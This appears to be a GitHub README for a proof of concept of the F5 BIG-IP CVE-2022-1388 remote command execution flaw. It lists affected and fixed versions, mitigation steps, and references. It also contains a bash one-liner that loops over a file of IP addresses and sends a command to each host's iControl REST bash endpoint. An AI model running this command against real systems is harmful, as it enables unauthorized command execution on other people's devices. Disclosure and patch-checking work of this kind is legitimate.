# BIG-IP iControl REST vulnerability CVE-2022-1388 PoC

![f5logo](f5.jpeg)

This vulnerability may allow an unauthenticated attacker with network access to the BIG-IP system through the management port and/or self IP addresses to execute arbitrary system commands, create or delete files, or disable services

## PoC

You can use the following curl one liner to check for the F5 Big-IP vulnerability or use the provided python script.

```bash
cat ips.txt | while read ip; do curl -su admin -H "Content-Type: application/json" http://$ip/mgmt/tm/util/bash -d '{"command":"run","utilCmdArgs":"-c id"}';done
```

## Vulnerable Versions (Big-IP)

| Branch | Vulnerable Versions | Fixes Introduced |
| ---- | ----| ---- |
|11.x|11.6.1-11.6.5|No Fix|
|12.x|12.1.0-12.1.6|No Fix|
|13.x|13.1.0-13.1.4|13.1.5|
|14.x|14.1.0-14.1.4|14.1.4.6|
|15.x|15.1.0-15.1.5|15.1.5.1|
|16.x|16.1.0-16.1.2|16.1.2.2|
|17.x|None|17.0.0|

## Mitigation

<ul>
  <li>Upgrade to the fixed version in ```Fixes Introduced``` Column. (Preferred Method)</li>
  <li>Block iControl REST access through the self IP address</li>
  <li>Block iControl REST access through the management interface</li>
  <li>Modify the BIG-IP httpd configuration</li>
</ul>

For more information about mitigation check out the references. 

## References
<ul>
  <li>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-1388</li>
  <li>https://support.f5.com/csp/article/K23605346</li>
  <li>https://github.com/ZephrFish/F5-CVE-2022-1388-Exploit</li>
</ul>
